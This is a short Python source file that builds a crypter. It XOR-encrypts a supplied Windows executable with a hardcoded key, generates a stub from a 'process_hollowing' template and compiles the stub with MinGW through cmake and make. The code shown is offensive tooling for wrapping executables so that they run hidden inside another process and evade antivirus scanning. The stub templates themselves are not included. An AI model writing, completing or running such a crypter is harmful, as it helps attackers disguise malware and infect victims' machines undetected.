from itertools import cycle
from operator import xor
import os
import pefile
import subprocess
import uuid

import secrets
from cookiecutter.main import cookiecutter


def build(file_data):
    # key = bytearray(secrets.token_urlsafe(15), encoding="utf-8")
    key = b"this is some supersecret password"
    encrypted_data = encrypt(key, file_data)
    temp_path = os.path.join("/stubborn/tmp", str(uuid.uuid4()))
    pe = pefile.PE(data=file_data)
    compiler, windres = get_compiler_windres(pe)
    if not compiler or not windres:
        return
    cookiecutter_data = {"target_dir": temp_path, "encryption_key": key.decode("unicode_escape"), "build_type": "Debug",
                         "compiler": compiler, "windres": windres}
    cookiecutter("/stubborn/stub_templates/process_hollowing/", no_input=True, extra_context=cookiecutter_data)
    encrypted_file = os.path.join(temp_path, "crypt.exe")
    with open(encrypted_file, mode="wb") as f:
        f.write(encrypted_data)
    os.mkdir(os.path.join(temp_path, "cmake"))
    subprocess.call(["cmake", "../"], cwd=os.path.join(temp_path, "cmake"))
    subprocess.call(["make"], cwd=os.path.join(temp_path, "cmake"))
    return os.path.join(temp_path, "cmake", "stubborn")


def encrypt(key, data):
    return bytearray(map(xor, data, cycle(key)))


def get_compiler_windres(pe):
    if pe.OPTIONAL_HEADER.Magic == pefile.OPTIONAL_HEADER_MAGIC_PE:
        return "i686-w64-mingw32-g++", "i686-w64-mingw32-windres"
    if pe.OPTIONAL_HEADER.Magic == pefile.OPTIONAL_HEADER_MAGIC_PE_PLUS:
        return "x86_64-w64-mingw32-g++", "x86_64-w64-mingw32-windres"
    return None, None
